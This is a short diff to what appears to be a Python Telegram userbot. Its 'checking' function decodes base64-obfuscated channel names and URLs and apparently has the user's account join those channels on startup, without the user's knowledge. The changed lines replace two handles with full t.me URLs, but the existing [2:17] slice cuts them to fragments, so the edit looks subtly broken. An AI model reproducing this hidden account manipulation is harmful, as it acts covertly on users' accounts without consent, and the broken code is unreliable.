@@ -80,10 +80,10 @@ async def get_user_from_event(
 
 async def checking(client):
     gocheck = str(pybase64.b64decode("b2hnaXR1bmlo"))[2:15]
-    checker = str(pybase64.b64decode("VXB1dHRzdXBwb3J0"))[2:17]
+    checker = str(pybase64.b64decode("aHR0cHM6Ly90Lm1lL1VwdXR0c3VwcG9ydA=="))[2:17]
     checkay = str(pybase64.b64decode("aGlzdG9yeWJ1YnU="))[2:15]
     checksbt = str(pybase64.b64decode("QFNoYXJpbmdVc2VyYm90"))[2:17]
-    checkaxs = str(pybase64.b64decode("S2FyYzBkZQ=="))[2:17]
+    checkaxs = str(pybase64.b64decode("aHR0cHM6Ly90Lm1lL0thcmMwZGU="))[2:17]
     if client:
         try:
             await client(Get(gocheck))
